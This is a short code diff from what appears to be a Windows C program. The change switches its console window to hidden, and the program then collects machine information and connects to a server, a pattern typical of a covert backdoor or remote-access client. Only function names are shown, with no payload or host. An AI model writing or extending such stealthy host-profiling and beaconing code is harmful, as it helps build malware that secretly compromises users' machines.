@@ -3,8 +3,8 @@
 int main() {
 	HANDLE thread1;
 	ShowWindow(GetConsoleWindow(), 
-		//SW_HIDE
-		SW_NORMAL
+		SW_HIDE
+		//SW_NORMAL
 	); // Hide the console window
 	int ret = getMachineInformation(); if(ret) goto _error;
 	if ((ret = connectToServer()) != 0) { goto _error; }
